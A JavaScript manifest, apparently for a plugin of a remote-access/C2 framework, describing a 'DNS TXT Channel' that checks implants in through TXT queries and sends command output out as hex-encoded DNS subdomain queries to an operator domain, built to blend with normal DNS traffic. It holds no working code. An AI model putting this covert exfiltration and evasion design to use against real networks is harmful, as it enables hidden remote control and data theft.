const manifest = {
  "title": "DNS TXT Channel",
  "component_type": "channel",
  "author": "ph3eds",
  "description": "DNS TXT-based C2 channel. Check-in issues a TXT query for c.<rat_hex>.<domain>; output is sent as hex chunks via s.<seq>.<chunk>.<sess>.<domain> queries. No WinHTTP / network socket dependency — traffic blends with normal DNS resolution. Operator sets the 'URL' config field to the bare C2 domain (e.g. c2.example.com). Requires a matching DNS station channel on the server.",
  "mitre": [
    "T1071.004"
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1071/004/"
  ],
  "parameters": [
    {
      "name": "station",
      "placeholder": "{{STATION}}",
      "type": "",
      "description": "C2 domain (bare, no http:// prefix — e.g. c2.example.com). Set via the 'URL' field in build config.",
      "default": ""
    }
  ],
  "cargo_deps": {
    "windows": {
      "version": "0.58",
      "features": [
        "Win32_NetworkManagement_Dns",
        "Win32_Foundation"
      ]
    }
  }
}
export { manifest }
